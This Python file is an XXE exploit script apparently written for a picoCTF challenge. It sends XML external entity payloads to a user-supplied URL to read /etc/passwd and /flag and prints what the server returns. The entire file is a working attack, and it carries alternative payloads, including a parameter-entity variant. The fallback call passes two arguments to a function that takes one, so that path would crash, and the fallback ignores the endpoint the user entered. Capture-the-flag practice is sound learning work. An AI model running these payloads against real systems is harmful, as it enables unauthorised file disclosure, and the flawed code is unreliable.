import requests
from colorama import Fore, Back, Style

def exploit_xxe(target_base_url, targetEndpoint):
    """
    Exploit XXE vulnerability to read /etc/passwd
    """
    # endpoint to exploit
    endpoint = f"{targetEndpoint}" if '/' in targetEndpoint else f"/{targetEndpoint}"
    target_url = target_base_url + endpoint

    # XXE Payload to read /etc/passwd
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>'''

    headers = {
        'Content-Type': 'application/xml',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    print(f"Target URL: {target_url}")
    print("Sending XXE payload to read /etc/passwd...")
    print("=" * 60)

    try:
        response = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)

        print(f"Status Code: {response.status_code}")
        print("Response:")
        print("-" * 40)
        print(response.text)
        print("-" * 40)

        # Check if we successfully read /etc/passwd
        if "root:" in response.text and "bin/" in response.text:
            print("✅ SUCCESS: /etc/passwd file was read!")
            return True
        elif "picoCTF" in response.text:
            print("✅ FLAG FOUND!")
            return True
        else:
            print("❌ Response doesn't contain /etc/passwd content")
            return False

    except requests.exceptions.ConnectionError:
        print("❌ Connection refused - the instance might be down or URL is wrong")
        print("Make sure you've started a new instance and have the correct URL")
    except requests.exceptions.Timeout:
        print("❌ Request timed out")
    except Exception as e:
        print(f"❌ Error: {e}")

    return False

def try_alternative_payloads(target_base_url):
    """
    Try different XXE payloads if the first one doesn't work
    """
    endpoint = "/data"
    target_url = target_base_url + endpoint
    headers = {'Content-Type': 'application/xml'}

    payloads = [
        # Try without encoding declaration
        '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>''',

        # Try with different field name
        '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <id>&xxe;</id>
</data>''',

        # Try reading flag directly
        '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<data>
  <ID>&xxe;</ID>
</data>''',

        # Try with parameter entities
        '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<data>
  <ID>test</ID>
</data>'''
    ]

    for i, payload in enumerate(payloads):
        print(f"\nTrying alternative payload {i+1}...")
        try:
            response = requests.post(target_url, data=payload, headers=headers, timeout=5)
            print(f"Status: {response.status_code}")

            if "root:" in response.text or "picoCTF" in response.text:
                print("✅ SUCCESS!")
                print(response.text)
                return True
            elif response.status_code != 404:
                print(f"Different status code - might be working: {response.status_code}")
                print(f"Response preview: {response.text[:200]}...")
        except Exception as e:
            print(f"Error: {e}")

    return False

# MAIN EXECUTION
if __name__ == "__main__":
    target_base_url = str(input("enter target url: "))
    endpoint = str(input("enter endpoint: (eg: /data): "))

    print("XXE Exploit for PicoCTF")
    print("=" * 50)

    # First try the main exploit
    success = exploit_xxe(target_base_url, endpoint)

    # If that doesn't work, try alternative payloads
    if not success:
        print("\nTrying alternative payloads...")
        try_alternative_payloads(target_base_url, endpoint)